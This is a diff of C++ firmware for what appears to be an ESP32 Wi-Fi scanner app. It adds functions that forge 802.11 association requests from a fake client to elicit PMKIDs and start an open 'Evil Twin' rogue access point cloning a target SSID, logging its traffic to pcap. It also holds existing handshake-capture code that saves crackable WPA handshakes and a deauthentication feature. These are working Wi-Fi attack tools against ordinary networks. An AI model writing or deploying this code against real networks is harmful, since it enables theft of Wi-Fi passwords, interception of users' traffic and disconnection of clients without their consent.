+    uint8_t frame[64] = {0};
+    frame[0] = 0x00;
+    frame[1] = 0x00;
+    frame[2] = 0x3a;
+    frame[3] = 0x01;
+    memcpy(frame + 4, bssid, 6);
+    memcpy(frame + 10, fakeClient, 6);
+    memcpy(frame + 16, bssid, 6);
+
+    frame[24] = 0x31;
+    frame[25] = 0x01;
+    frame[26] = 0x0a;
+    frame[27] = 0x00;
+
+    int idx = 28;
+    frame[idx++] = 0;
+    frame[idx++] = ssidLen;
+    if (ssidLen > 0) {
+        memcpy(frame + idx, ssid, ssidLen);
+        idx += ssidLen;
+    }
+
+    frame[idx++] = 1;
+    frame[idx++] = 8;
+    uint8_t rates[8] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
+    memcpy(frame + idx, rates, 8);
+    idx += 8;
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, idx, true);
+    if (err != ESP_OK) {
+        LOG_W(TAG, "assoc_req: esp_wifi_80211_tx failed: %s", esp_err_to_name(err));
+    }
+}
+
+struct AssocTaskParams {
+    uint8_t bssid[6];
+    char ssid[33];
+    int channel;
+};
+
+void assocBurstTask(void* arg) {
+    auto* params = static_cast<AssocTaskParams*>(arg);
+
     int i = 0;
-    for (; i < 40 && getCurrentRadioChannel() != channel; i++) {
+    for (; i < 40 && getCurrentRadioChannel() != params->channel; i++) {
         vTaskDelay(pdMS_TO_TICKS(10));
     }
-    if (i >= 40) {
-        // Sends anyway - better than silently doing nothing - but on the wrong channel this
-        // burst goes out into empty air, which looks identical to "deauth did nothing" from
-        // the outside. This is the one case worth knowing about from the serial log.
-        LOG_W(TAG, "deauth: radio never reached channel %d (stuck at %d) - sending anyway",
-            channel, getCurrentRadioChannel());
+
+    uint8_t fakeClient[6] = {0x02, 0xDE, 0xAD, 0xBE, 0xEF, 0x01};
+    std::string bssidStr = macToString(params->bssid);
+    std::string clientStr = macToString(fakeClient);
+
+    for (int set = 0; set < ASSOC_BURST_SETS; set++) {
+        LOG_I(TAG, "assoc_req (PMKID): burst %d/%d ch%d | FakeClient: %s -> AP BSSID: %s (SSID: '%s')", 
+            set + 1, ASSOC_BURST_SETS, params->channel, clientStr.c_str(), bssidStr.c_str(), params->ssid);
+        for (int j = 0; j < ASSOC_FRAMES_PER_SET; j++) {
+            sendAssociationRequest(params->bssid, params->ssid, fakeClient);
+            vTaskDelay(pdMS_TO_TICKS(ASSOC_FRAME_GAP_MS));
+        }
+        if (set < ASSOC_BURST_SETS - 1) {
+            vTaskDelay(pdMS_TO_TICKS(ASSOC_SET_GAP_MS));
+        }
     }
-    sendDeauthBurst(bssid, nullptr);
+
+    delete params;
+    vTaskDelete(nullptr);
 }
 
-// ---- EAPOL capture sound ----
+void sendAssociationRequestBurst(const uint8_t* bssid, const char* ssid, int channel) {
+    auto* params = new AssocTaskParams{};
+    memcpy(params->bssid, bssid, 6);
+    if (ssid) {
+        strncpy(params->ssid, ssid, sizeof(params->ssid) - 1);
+    }
+    params->channel = channel;
 
-// Ships as a firmware asset under the internal /data partition (Data/data/wifiscanner/), not
-// /sdcard/Music, so it plays regardless of SD card contents and never shows up in the Music
-// app's library (that only browses .../Music).
+    xTaskCreatePinnedToCore(assocBurstTask, "wifi_assoc", 3072, params, tskIDLE_PRIORITY + 1, nullptr, WIFI_TASK_CORE_ID);
+}
+
+// ---- Evil Twin / Rogue AP & PCAP functions ----
+
+static FILE* g_etPcapFile = nullptr;
+static RecursiveMutex g_etPcapMutex;
+static std::atomic<uint32_t> g_etPacketsLogged{0};
+
+void pcapU32(FILE* f, uint32_t v) { fwrite(&v, 4, 1, f); }
+void pcapU16(FILE* f, uint16_t v) { fwrite(&v, 2, 1, f); }
+
+void pcapRecord(FILE* f, const uint8_t* data, int len) {
+    struct timeval tv;
+    gettimeofday(&tv, nullptr);
+    pcapU32(f, (uint32_t)tv.tv_sec);
+    pcapU32(f, (uint32_t)tv.tv_usec);
+    pcapU32(f, (uint32_t)len);
+    pcapU32(f, (uint32_t)len);
+    fwrite(data, 1, len, f);
+}
+
+bool startEvilTwinLogging(const char* ssid) {
+    if (!g_etPcapMutex.lock(500 / portTICK_PERIOD_MS)) return false;
+    if (g_etPcapFile != nullptr) {
+        g_etPcapMutex.unlock();
+        return true;
+    }
+    mkdir("/sdcard/wifi-scanner", 0777);
+    mkdir("/sdcard/wifi-scanner/eviltwin", 0777);
+
+    char safe[33];
+    int j = 0;
+    for (int i = 0; ssid && ssid[i] != '\0' && j < 32; i++) {
+        char c = ssid[i];
+        safe[j++] = (c > 32 && c < 127 && c != '/' && c != '\\') ? c : '_';
+    }
+    safe[j] = '\0';
+
+    char path[128];
+    struct timeval tv;
+    gettimeofday(&tv, nullptr);
+    if (tv.tv_sec > 1700000000) {
+        struct tm tm_info;
+        localtime_r(&tv.tv_sec, &tm_info);
+        char timeStr[20];
+        strftime(timeStr, sizeof(timeStr), "%Y%m%d_%H%M%S", &tm_info);
+        snprintf(path, sizeof(path), "/sdcard/wifi-scanner/eviltwin/%s_%s.pcap",
+            safe[0] != '\0' ? safe : "eviltwin", timeStr);
+    } else {
+        snprintf(path, sizeof(path), "/sdcard/wifi-scanner/eviltwin/%s_%lu.pcap",
+            safe[0] != '\0' ? safe : "eviltwin", (unsigned long)(esp_timer_get_time() / 1000000));
+    }
+
+    g_etPcapFile = fopen(path, "wb");
+    if (g_etPcapFile != nullptr) {
+        pcapU32(g_etPcapFile, 0xA1B2C3D4);
+        pcapU16(g_etPcapFile, 2); pcapU16(g_etPcapFile, 4);
+        pcapU32(g_etPcapFile, 0); pcapU32(g_etPcapFile, 0);
+        pcapU32(g_etPcapFile, 65535);
+        pcapU32(g_etPcapFile, 105);
+        fflush(g_etPcapFile);
+        g_etPacketsLogged.store(0);
+        LOG_I(TAG, "Evil Twin PCAP recording started: %s", path);
+    } else {
+        LOG_E(TAG, "Failed to create Evil Twin PCAP: %s", path);
+    }
+    g_etPcapMutex.unlock();
+    return g_etPcapFile != nullptr;
+}
+
+void stopEvilTwinLogging() {
+    if (!g_etPcapMutex.lock(500 / portTICK_PERIOD_MS)) return;
+    if (g_etPcapFile != nullptr) {
+        fflush(g_etPcapFile);
+        fclose(g_etPcapFile);
+        g_etPcapFile = nullptr;
+        LOG_I(TAG, "Evil Twin PCAP closed. Total packets logged: %u", (unsigned)g_etPacketsLogged.load());
+    }
+    g_etPcapMutex.unlock();
+}
+
+void logEvilTwinPacket(const uint8_t* payload, int len) {
+    if (g_etPcapFile == nullptr) return;
+    if (g_etPcapMutex.lock(0)) {
+        if (g_etPcapFile != nullptr) {
+            pcapRecord(g_etPcapFile, payload, len);
+            uint32_t count = g_etPacketsLogged.fetch_add(1) + 1;
+            if ((count % 10) == 0) {
+                fflush(g_etPcapFile);
+            }
+        }
+        g_etPcapMutex.unlock();
+    }
+}
+
+void startEvilTwinAp(const char* ssid, int channel) {
+    esp_netif_t* netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+    if (netif == nullptr) {
+        esp_netif_create_default_wifi_ap();
+    }
+    wifi_config_t ap_config = {};
+    strlcpy(reinterpret_cast<char*>(ap_config.ap.ssid), ssid, sizeof(ap_config.ap.ssid));
+    ap_config.ap.ssid_len = strlen(ssid);
+    ap_config.ap.channel = channel;
+    ap_config.ap.max_connection = 8;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    esp_wifi_start();
+    LOG_I(TAG, "Evil Twin Rogue AP started: SSID='%s' on ch%d", ssid, channel);
+}
+
+void stopEvilTwinAp() {
+    stopEvilTwinLogging();
+    wifi_mode_t mode;
+    esp_wifi_get_mode(&mode);
+    if (mode == WIFI_MODE_APSTA) {
+        esp_wifi_set_mode(WIFI_MODE_STA);
+    } else if (mode == WIFI_MODE_AP) {
+        esp_wifi_stop();
+    }
+    LOG_I(TAG, "Evil Twin Rogue AP stopped");
+}
+
 constexpr auto* EAPOL_BEEP_PATH = "/data/wifiscanner/eapol_beep.mp3";
-constexpr int EAPOL_BEEP_MAX_WAIT_MS = 1000; // bounded: a stuck decoder can't hang this task forever
+constexpr int EAPOL_BEEP_MAX_WAIT_MS = 1200;
 constexpr int FADE_STEP_MS = 25;
 constexpr int FADE_STEP_DB = 4;
-constexpr int DUCK_FLOOR_DB = -20; // service::music::setGainDb()'s documented minimum - no mute API
+constexpr int DUCK_FLOOR_DB = -20;
 
-/** Runs on its own task (never the RX callback or the app timer) so its fades and waits can't
- * delay packet capture. If music is playing: fade it out, pause it, play the beep at normal
- * volume (so it's actually audible), then resume the track from where it paused while fading
- * back in. If nothing is playing, just play the beep. */
+static std::atomic<bool> g_soundTaskRunning{false};
+
 void eapolSoundTask(void* /*arg*/) {
     using namespace tt::service::music;
     if (isAvailable()) {
@@ -711,18 +881,27 @@ void eapolSoundTask(void* /*arg*/) {
                 vTaskDelay(pdMS_TO_TICKS(FADE_STEP_MS));
             }
             setGainDb(DUCK_FLOOR_DB);
-            playPause(); // freezes the track at savedPosition
-            setGainDb(originalGain); // restore before the beep, so it isn't ducked too
+            playPause();
+            setGainDb(originalGain);
         }
 
         enqueueAndPlay(EAPOL_BEEP_PATH);
-        for (int waited = 0; waited < EAPOL_BEEP_MAX_WAIT_MS && !getTelemetry().finished; waited += 20) {
-            vTaskDelay(pdMS_TO_TICKS(20));
+        // Wait for player to transition from Stopped/Idle to Playing (up to 250ms)
+        for (int w = 0; w < 10; w++) {
+            vTaskDelay(pdMS_TO_TICKS(25));
+            if (getTelemetry().state == State::Playing) break;
         }
-        removeFromQueueByPath(EAPOL_BEEP_PATH); // one-shot notification, not a library track
+        // Wait for playback to complete (up to 1200ms)
+        for (int waited = 0; waited < EAPOL_BEEP_MAX_WAIT_MS; waited += 40) {
+            vTaskDelay(pdMS_TO_TICKS(40));
+            auto tel = getTelemetry();
+            if (tel.state == State::Stopped || tel.finished) break;
+        }
+        vTaskDelay(pdMS_TO_TICKS(60));
+        removeFromQueueByPath(EAPOL_BEEP_PATH);
 
         if (wasPlaying) {
-            setGainDb(DUCK_FLOOR_DB); // drop back down first, so the resume itself fades in
+            setGainDb(DUCK_FLOOR_DB);
             playQueueIndex(trackIndex);
             seek(savedPosition);
             for (int g = DUCK_FLOOR_DB; g < originalGain; g += FADE_STEP_DB) {
@@ -732,33 +911,21 @@ void eapolSoundTask(void* /*arg*/) {
             setGainDb(originalGain);
         }
     }
+    g_soundTaskRunning.store(false);
     vTaskDelete(nullptr);
 }
 
-/** Fire-and-forget: called from flushHandshakes() when a handshake just became crackable. */
 void triggerEapolSound() {
+    bool expected = false;
+    if (!g_soundTaskRunning.compare_exchange_strong(expected, true)) {
+        return; // An eapol sound is already playing
+    }
     xTaskCreate([](void* arg) { eapolSoundTask(arg); }, "wifiscanner_beep", 4096, nullptr,
         tskIDLE_PRIORITY + 1, nullptr);
 }
 
-// ---- .pcap writing (handshake export to SD) ----
-
-void pcapU32(FILE* f, uint32_t v) { fwrite(&v, 4, 1, f); } // ESP32 is little-endian = pcap LE
-void pcapU16(FILE* f, uint16_t v) { fwrite(&v, 2, 1, f); }
-
-void pcapRecord(FILE* f, const uint8_t* data, int len) {
-    uint64_t us = (uint64_t)esp_timer_get_time();
-    pcapU32(f, (uint32_t)(us / 1000000));
-    pcapU32(f, (uint32_t)(us % 1000000));
-    pcapU32(f, (uint32_t)len);
-    pcapU32(f, (uint32_t)len);
-    fwrite(data, 1, len, f);
-}
-
-/** Writes beacon + captured EAPOL frames as a LINKTYPE_IEEE802_11 .pcap under /sdcard/handshakes.
- * Crack on a PC: hcxpcapngtool file.pcap -o hash.22000  (then hashcat -m 22000), or aircrack-ng. */
 bool savePcap(const HandshakeCapture& hc, uint64_t bssidKeyVal) {
-    mkdir("/sdcard/wifi-scanner", 0777); // mkdir doesn't create parents, so make each level
+    mkdir("/sdcard/wifi-scanner", 0777);
     mkdir("/sdcard/wifi-scanner/handshakes", 0777);
     char safe[33];
     int j = 0;
@@ -767,17 +934,28 @@ bool savePcap(const HandshakeCapture& hc, uint64_t bssidKeyVal) {
         safe[j++] = (c > 32 && c < 127 && c != '/' && c != '\\') ? c : '_';
     }
     safe[j] = '\0';
-    char path[112];
-    snprintf(path, sizeof(path), "/sdcard/wifi-scanner/handshakes/%s_%012llX.pcap",
-        safe[0] != '\0' ? safe : "hidden", (unsigned long long)bssidKeyVal);
+    char path[128];
+    struct timeval tv;
+    gettimeofday(&tv, nullptr);
+    if (tv.tv_sec > 1700000000) {
+        struct tm tm_info;
+        localtime_r(&tv.tv_sec, &tm_info);
+        char timeStr[20];
+        strftime(timeStr, sizeof(timeStr), "%Y%m%d_%H%M%S", &tm_info);
+        snprintf(path, sizeof(path), "/sdcard/wifi-scanner/handshakes/%s_%012llX_%s.pcap",
+            safe[0] != '\0' ? safe : "hidden", (unsigned long long)bssidKeyVal, timeStr);
+    } else {
+        snprintf(path, sizeof(path), "/sdcard/wifi-scanner/handshakes/%s_%012llX.pcap",
+            safe[0] != '\0' ? safe : "hidden", (unsigned long long)bssidKeyVal);
+    }
 
     FILE* f = fopen(path, "wb");
     if (f == nullptr) return false;
-    pcapU32(f, 0xA1B2C3D4); // magic
-    pcapU16(f, 2); pcapU16(f, 4); // version 2.4
-    pcapU32(f, 0); pcapU32(f, 0); // thiszone, sigfigs
-    pcapU32(f, 65535);            // snaplen
-    pcapU32(f, 105);              // LINKTYPE_IEEE802_11
+    pcapU32(f, 0xA1B2C3D4);
+    pcapU16(f, 2); pcapU16(f, 4);
+    pcapU32(f, 0); pcapU32(f, 0);
+    pcapU32(f, 65535);
+    pcapU32(f, 105);
     if (hc.beaconLen > 0) pcapRecord(f, hc.beacon, hc.beaconLen);
     for (int s = 0; s < 4; s++) {
         if (hc.eapolLen[s] > 0) pcapRecord(f, hc.eapol[s], hc.eapolLen[s]);
@@ -795,41 +973,36 @@ void setCaptureLockChannel(int) {}
 int getCaptureLockChannel() { return 0; }
 int getCurrentRadioChannel() { return 0; }
 void sendDeauthBurst(const uint8_t*, const uint8_t*) {}
-void sendDeauthBurstOnChannel(const uint8_t*, int) {}
+void sendDeauthBurstOnChannel(const uint8_t*, int, const uint8_t* = nullptr) {}
+void sendAssociationRequestBurst(const uint8_t*, const char*, int) {}
+void startEvilTwinAp(const char*, int) {}
+void stopEvilTwinAp() {}
+bool startEvilTwinLogging(const char*) { return false; }
+void stopEvilTwinLogging() {}
+void logEvilTwinPacket(const uint8_t*, int) {}
 
-#endif // ESP_PLATFORM
+#endif
 
-/** A handshake is worth saving once we have M1+M2 (enough to crack) or a PMKID. Called from the
- * app timer (not the RX callback): copies one ready capture out under the lock, then writes it to
- * SD outside the lock so the slow card I/O never blocks packet reception. */
 void flushHandshakes(Context* ctx) {
 #ifdef ESP_PLATFORM
     auto ready = std::make_unique<HandshakeCapture>();
     uint64_t key = 0;
     bool have = false;
-    bool beep = false;
     if (ctx->mutex.lock(50 / portTICK_PERIOD_MS)) {
         for (auto& [k, hc] : ctx->handshakes) {
-            bool crackable = ((hc.msgMask & 0x03) == 0x03) || hc.hasPmkid; // M1+M2, or PMKID
-            // `saved` is re-armed by every new message (M3/M4 arriving after M1+M2), so it can't
-            // gate the beep too - that fired a second eapolSoundTask moments after the first,
-            // racing it for the Music service's state and killing the audible beep. `beepFired`
-            // is set once and never reset, so this fires exactly once per handshake.
-            if (crackable && !hc.beepFired) {
-                hc.beepFired = true;
-                beep = true;
-            }
-            if (crackable && !hc.saved && !have) {
+            bool crackable = ((hc.msgMask & 0x03) == 0x03) || hc.hasPmkid;
+            if (crackable && !hc.saved) {
                 *ready = hc;
                 key = k;
                 hc.saved = true;
                 have = true;
+                break;
             }
         }
         ctx->mutex.unlock();
     }
-    if (beep) triggerEapolSound();
     if (have) {
+        triggerEapolSound();
         if (savePcap(*ready, key)) {
             if (ctx->mutex.lock(50 / portTICK_PERIOD_MS)) {
                 ctx->handshakesSaved++;
@@ -842,8 +1015,6 @@ void flushHandshakes(Context* ctx) {
 #endif
 }
 
-// ---- Formatting helpers ----
-
 const char* authToString(WifiAuthenticationType type) {
     switch (type) {
         case WIFI_AUTHENTICATION_TYPE_OPEN: return "OPEN";
@@ -855,21 +1026,6 @@ const char* authToString(WifiAuthenticationType type) {
         case WIFI_AUTHENTICATION_TYPE_WPA3_PSK: return "WPA3";
         case WIFI_AUTHENTICATION_TYPE_WPA2_WPA3_PSK: return "WPA2/3";
         default: return "?";
-    }
-}
-
-/** Color-codes the list/detail by how open the network is; open is deliberately red, not green. */
-uint32_t securityColor(WifiAuthenticationType type) {
-    switch (type) {
-        case WIFI_AUTHENTICATION_TYPE_OPEN: return 0xE53935;
-        case WIFI_AUTHENTICATION_TYPE_WEP: return 0xFB8C00;
-        case WIFI_AUTHENTICATION_TYPE_WPA_PSK: return 0xFDD835;
-        case WIFI_AUTHENTICATION_TYPE_WPA2_PSK: return 0x7CB342;
-        case WIFI_AUTHENTICATION_TYPE_WPA_WPA2_PSK: return 0x43A047;
-        case WIFI_AUTHENTICATION_TYPE_WPA2_ENTERPRISE: return 0x1E88E5;
-        case WIFI_AUTHENTICATION_TYPE_WPA3_PSK: return 0x8E24AA;
-        case WIFI_AUTHENTICATION_TYPE_WPA2_WPA3_PSK: return 0x3949AB;
-        default: return 0x757575;
     }
 }
 
@@ -895,12 +1051,6 @@ std::string phyToString(uint8_t flags) {
     return result.empty() ? "?" : ("802.11" + result);
 }
 
-std::string macToString(const uint8_t* mac) {
-    char text[18];
-    snprintf(text, sizeof(text), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
-    return text;
-}
-
 const char* displaySsid(const WifiApRecord& record) {
     return record.ssid[0] != '\0' ? record.ssid : "(nascosta)";
 }
@@ -919,12 +1069,9 @@ bool isRadioUsable() {
     return state == On || state == ConnectionPending || state == ConnectionActive;
 }
 
-// ---- Shared state helpers ----
-
 void connectTo(Context* ctx, const std::string& ssid) {
     service::wifi::settings::WifiApSettings settings;
     if (service::wifi::settings::load(ssid, settings)) {
-        LOG_I(TAG, "Connecting with known credentials");
         service::wifi::connect(settings, false);
     } else {
         wificonnect::start(ssid);
@@ -932,7 +1079,6 @@ void connectTo(Context* ctx, const std::string& ssid) {
     (void)ctx;
 }
 
-/** Fills one bell-curve series centered on the given channel/RSSI. */
 void fillBell(lv_obj_t* chart, lv_chart_series_t* series, int channel, int8_t rssi) {
     int32_t values[CHART_POINTS];
     int32_t height = std::clamp<int32_t>(rssi - SIGNAL_FLOOR_DBM, 1, SIGNAL_RANGE_DB);
@@ -940,15 +1086,11 @@ void fillBell(lv_obj_t* chart, lv_chart_series_t* series, int channel, int8_t rs
     for (int i = 0; i < CHART_POINTS; i++) {
         float x = CH_AXIS_MIN + step * i;
         float distance = std::fabs(x - (float)channel) / BELL_HALF_WIDTH;
-        // 0 outside the bell (not POINT_NONE) so the curve sits on the zero baseline and the bell
-        // rises from it, instead of floating with gaps at the edges.
         values[i] = distance < 1.0f ? (int32_t)(height * (1.0f - distance * distance)) : 0;
     }
     lv_chart_set_series_values(chart, series, values, CHART_POINTS);
 }
 
-/** Snapshot of ctx->seen as a vector sorted by signal strength, with stale rows dropped.
- * Must be called with ctx->mutex held. */
 std::vector<SeenAp> sortedByRssi(Context* ctx) {
     std::vector<SeenAp> result;
     uint64_t now = nowMs();
@@ -956,7 +1098,6 @@ std::vector<SeenAp> sortedByRssi(Context* ctx) {
         if (now - it->second.lastSeenMs > ROW_EXPIRY_MS) {
             it = ctx->seen.erase(it);
         } else {
-            rolloverDataRate(it->second, now); // zeroes a network's rate once it goes quiet
             result.push_back(it->second);
             ++it;
         }
@@ -967,7 +1108,6 @@ std::vector<SeenAp> sortedByRssi(Context* ctx) {
     return result;
 }
 
-/** Merges fresh active-scan results into ctx->seen. Must be called with ctx->mutex held. */
 void mergeActiveScan(Context* ctx, const std::vector<WifiApRecord>& records) {
     uint64_t now = nowMs();
     for (const auto& record : records) {
@@ -976,6 +1116,7 @@ void mergeActiveScan(Context* ctx, const std::vector<WifiApRecord>& records) {
         if (it == ctx->seen.end()) {
             SeenAp ap{};
             ap.record = record;
+            sanitizeAscii(ap.record.ssid);
             ap.firstSeenMs = now;
             ap.lastSeenMs = now;
             ap.rssiMin = ap.rssiMax = record.rssi;
@@ -983,7 +1124,8 @@ void mergeActiveScan(Context* ctx, const std::vector<WifiApRecord>& records) {
             ctx->seen.emplace(key, ap);
         } else {
             SeenAp& ap = it->second;
-            ap.record = record; // the active scan is authoritative over our capture heuristics
+            ap.record = record;
+            sanitizeAscii(ap.record.ssid);
             ap.fromCapture = false;
             ap.lastSeenMs = now;
             ap.rssiMin = std::min(ap.rssiMin, record.rssi);
@@ -991,8 +1133,6 @@ void mergeActiveScan(Context* ctx, const std::vector<WifiApRecord>& records) {
         }
     }
 }
-
-// ---- LED strip (NeoPixel) feedback ----
 
 void saveLedConfig(Context* ctx) {
     namespace np = service::neopixel;
@@ -1017,7 +1157,6 @@ void saveLedConfig(Context* ctx) {
 void restoreLedConfig(Context* ctx) {
     namespace np = service::neopixel;
     if (!ctx->ledSaved) return;
-    // Put the VU meter back the way the user had it, then the Active-stage animation.
     np::setVuPalette(ctx->savedVuPalette);
     np::setVuOrigin(ctx->savedVuOrigin);
     np::setVuColor(ctx->savedVuR, ctx->savedVuG, ctx->savedVuB);
@@ -1035,11 +1174,8 @@ void restoreLedConfig(Context* ctx) {
     np::setActiveAnimation(ctx->savedAnim);
 }
 
-/** Drives the strip from the current page/mode/selection. Caches what was last pushed so the
- * animation isn't restarted on every 1 s refresh; only real changes are applied. */
 void updateLeds(Context* ctx) {
     namespace np = service::neopixel;
-
     Page page;
     RadioMode mode;
     uint64_t selectedKey;
@@ -1052,8 +1188,7 @@ void updateLeds(Context* ctx) {
         return;
     }
 
-    // The proximity bar is shown both in a network's detail and in its clients page.
-    if (page == Page::Detail || page == Page::Clients) {
+    if (page == Page::Detail || page == Page::Clients || page == Page::EvilTwinDetail) {
         int colorIdx = 0;
         int8_t rssi = SIGNAL_FLOOR_DBM;
         bool found = false;
@@ -1068,18 +1203,15 @@ void updateLeds(Context* ctx) {
         }
         if (!found) return;
 
-        // Borrow the VU meter to draw a proximity bar: the strip fills up like an equaliser, in
-        // the network's colour, more LEDs lit the closer (stronger) the AP is. Fed fast and
-        // continuously by ledTimer (so it never blinks).
         if (ctx->ledViewApplied != 3) {
             np::setVuPalette(np::VuPalette::Solid);
             np::setVuOrigin(np::VuOrigin::BothLeft);
-            np::setVuDecayEnabled(true);      // the swell at each refresh eases back down
-            np::setVuAutoGainEnabled(false);  // our mapping is already the full scale
+            np::setVuDecayEnabled(true);
+            np::setVuAutoGainEnabled(false);
             np::setVuBeatFlashEnabled(false);
-            np::setVuPeakHoldEnabled(true);   // the bright peak dot that lingers at the recent max
+            np::setVuPeakHoldEnabled(true);
             np::setVuPeakBrightness(90);
-            np::setVuSensitivity(100);        // show the whole range we feed
+            np::setVuSensitivity(100);
             np::setVuBrightness(ctx->savedBrightness != 0 ? ctx->savedBrightness : 70);
             np::setVuActive(true);
             ctx->vuFeeding.store(true);
@@ -1091,46 +1223,37 @@ void updateLeds(Context* ctx) {
             np::setVuColor((color >> 16) & 0xFF, (color >> 8) & 0xFF, color & 0xFF);
             ctx->ledColorApplied = colorIdx;
         }
-        // Map signal to bar length: far (floor) -> empty, near -> full. ledTimer feeds this value
-        // and adds a short "breath" swell at each refresh (vuRefreshTick marks when a fresh reading
-        // arrived). The peak dot then lingers at the swell's top, so you see if it was closer before.
         int32_t peak = std::clamp<int32_t>(rssi - SIGNAL_FLOOR_DBM, 0, SIGNAL_RANGE_DB);
         ctx->vuLevel.store((int)(peak * 255 / SIGNAL_RANGE_DB));
         ctx->vuRefreshTick.store((uint32_t)lv_tick_get());
         return;
     }
 
-    // Leaving the proximity view: stop feeding and hand the meter back before the mode animation.
     if (ctx->ledViewApplied == 3) {
         ctx->vuFeeding.store(false);
         np::setVuActive(false);
     }
 
-    // Graph / list: the strip reflects the capture state.
     int view = mode == RadioMode::Capture ? 1 : (mode == RadioMode::ActiveScan ? 0 : 2);
     if (ctx->ledViewApplied == view) return;
     ctx->ledViewApplied = view;
     ctx->ledColorApplied = -1;
 
-    if (view == 2) { // stopped -> put the user's own lighting back
+    if (view == 2) {
         restoreLedConfig(ctx);
         return;
     }
 
-    // A slow sonar wave running back and forth: green for active scan, red for channel hopping.
     np::setActiveColorMode(np::ColorMode::Static);
     if (view == 0) np::setActiveColor(0, 255, 0);
     else np::setActiveColor(255, 0, 0);
-    np::setActiveSpeed(2); // low = slow, so it glides rather than flickering
+    np::setActiveSpeed(2);
     np::setActiveAnimation(np::Animation::Scanner);
 }
 
-// ---- Forward declarations ----
-
 void showPage(Context* ctx, Page page);
 void updateViews(Context* ctx);
-
-// ---- Graph page ----
+void updateEvilTwinDetailPage(Context* ctx);
 
 void updateGraph(Context* ctx, const std::vector<SeenAp>& aps) {
     if (ctx->chart == nullptr) return;
@@ -1139,8 +1262,6 @@ void updateGraph(Context* ctx, const std::vector<SeenAp>& aps) {
     int chartWidth = lv_obj_get_width(ctx->chart);
     int chartHeight = lv_obj_get_height(ctx->chart);
 
-    // Draw the strongest networks into consecutive series slots (so none overwrite each other),
-    // recolouring each slot to that network's stable colour so its bell matches its list colour-bar.
     int drawn = 0;
     for (const auto& ap : aps) {
         if (drawn >= MAX_SERIES) break;
@@ -1158,16 +1279,13 @@ void updateGraph(Context* ctx, const std::vector<SeenAp>& aps) {
         int width = lv_obj_get_width(label);
         int height = lv_obj_get_height(label);
 
-        // X: centered on the bell's peak (same fraction as the channel number / reference line).
         int xPx = (int)(chartWidth * channelFraction(ap.record.channel)) - width / 2;
         if (xPx < 0) xPx = 0;
         if (xPx + width > chartWidth) xPx = chartWidth - width;
 
-        // Y: just above the peak, so each name sits on its own curve inside the chart. The peak
-        // height mirrors fillBell: clamp(rssi - floor, 1, range), with y=0 at the top of the chart.
         int32_t peak = std::clamp<int32_t>(ap.record.rssi - SIGNAL_FLOOR_DBM, 1, SIGNAL_RANGE_DB);
         int yPx = chartHeight - (chartHeight * peak / SIGNAL_RANGE_DB);
-        yPx -= height; // sit the text just above the peak instead of on top of it
+        yPx -= height;
         if (yPx < 0) yPx = 0;
         if (yPx + height > chartHeight) yPx = chartHeight - height;
 
@@ -1185,7 +1303,6 @@ void onShowList(lv_event_t* event) {
     showPage(static_cast<Context*>(lv_event_get_user_data(event)), Page::List);
 }
 
-/** Reflects ctx->mode on the three mode buttons: each is disabled while it's the active mode. */
 void refreshModeButtons(Context* ctx) {
     RadioMode mode;
     if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
@@ -1221,8 +1338,6 @@ void setMode(Context* ctx, RadioMode mode) {
     if (mode == RadioMode::Capture) startCapture(ctx);
     refreshModeButtons(ctx);
 
-    // Stopped freezes the views (updateViews returns early), so set the status text here;
-    // nothing else will.
     if (mode == RadioMode::Stopped) {
         lvgl_lock();
         if (ctx->statusLabel != nullptr) lv_label_set_text(ctx->statusLabel, "Capture stopped");
@@ -1246,13 +1361,8 @@ void onStop(lv_event_t* event) {
 
 void updateDetail(Context* ctx);
 
-// "Cattura mirata": park the radio on the selected network's channel so a full 4-way handshake
-// (or PMKID) lands on us instead of being missed while hopping. Second tap releases the lock.
 void onToggleLock(lv_event_t* event) {
     auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
-    // Read the channel cached at selection time, not a live ctx->seen lookup: if this AP hasn't
-    // been re-heard in 20s it has aged out of ctx->seen (see ROW_EXPIRY_MS), and a live lookup
-    // here would fail silently, leaving the radio parked forever with no way to release it.
     int channel = 0;
     if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
         channel = ctx->detailChannel;
@@ -1262,20 +1372,15 @@ void onToggleLock(lv_event_t* event) {
 
     bool nowLocked = getCaptureLockChannel() != channel;
     if (nowLocked) {
-        // Locking implies capturing: if we're only scanning (or stopped), switch to capture first
-        // so the hop task is actually running and able to park.
         if (ctx->mode != RadioMode::Capture) setMode(ctx, RadioMode::Capture);
         setCaptureLockChannel(channel);
     } else {
-        setCaptureLockChannel(0); // release: resume hopping, still capturing
+        setCaptureLockChannel(0);
     }
     updateDetail(ctx);
     updateLeds(ctx);
 }
 
-// Deauth is destructive (it disconnects a real client), so it always goes through a confirm
-// dialog rather than firing on tap - the actual send happens in appMain() once the dialog's
-// APP_EVENT_RESULT comes back confirmed.
 void onDeauthPressed(lv_event_t* event) {
     auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
     char ssid[33] = {};
@@ -1297,15 +1402,16 @@ void onDeauthPressed(lv_event_t* event) {
     ctx->deauthDialogId = tt::app::alertdialog::start(ctx->appInstanceId, "Deauth", message, { "Invia", "Annulla" });
 }
 
-void onShowClients(lv_event_t* event);
+void onShowClients(lv_event_t* event) {
+    showPage(static_cast<Context*>(lv_event_get_user_data(event)), Page::Clients);
+}
 
-// ---- List page ----
+void onShowEvilTwinDetail(lv_event_t* event) {
+    showPage(static_cast<Context*>(lv_event_get_user_data(event)), Page::EvilTwinDetail);
+}
 
 void onSelectFromList(lv_event_t* event) {
     auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
-    // The network key is 64-bit but a pointer on the ESP32-S3 is only 32-bit, so it can't be
-    // smuggled through lv_obj user_data (it would be truncated and the lookup would miss). Find
-    // the key by matching the clicked row against ctx->rows instead.
     lv_obj_t* row = lv_event_get_current_target_obj(event);
     uint64_t key = 0;
     if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
